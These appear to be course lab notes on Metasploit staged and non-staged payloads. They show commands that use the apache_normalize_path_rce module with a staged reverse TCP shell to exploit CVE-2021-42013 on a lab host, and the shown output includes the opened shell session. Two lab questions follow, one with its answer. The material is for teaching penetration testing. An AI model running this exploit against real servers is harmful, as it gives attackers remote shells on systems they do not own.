# Staged vs Non-Staged Payloads

Display compatible payloads of the exploit module
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
>
># ========== Expected Result ==========
>Compatible Payloads
>===================
>
>   #   Name                                              Disclosure Date  Rank    Check  Description
>   -   ----                                              ---------------  ----    -----  -----------
>...
>   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
>...
>   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
>...
># =====================================
>```

Use staged TCP reverse shell payload and launch exploit module
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15
>
># ========== Expected Result ==========
>payload => linux/x64/shell/reverse_tcp
># =====================================
>
>msf6 exploit(multi/http/apache_normalize_path_rce) > run
>
># ========== Expected Result ==========
>[*] Started reverse TCP handler on 192.168.119.4:4444 
>[*] Using auxiliary/scanner/http/apache_normalize_path as check
>[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
>[*] Scanned 1 of 1 hosts (100% complete)
>[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
>[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
>[*] Sending stage (38 bytes) to 192.168.50.16
>[!] Tried to delete /tmp/EqDPZD, unknown result
>[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at 2022-08-08 05:18:36 -0400
>
>id
>uid=1(daemon) gid=1(daemon) groups=1(daemon)
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to obtain a Metasploit session with a staged payload. Which character is used in Metasploit to denote whether a payload is staged or not?
>/

Lab 2 - Activate the module exploit/multi/http/apache_normalize_path_rce in Metasploit and list all compatible payloads. Find a 32bit staged reverse TCP command shell payload for Linux and enter its full name as answer.
>``` shell
>
>```
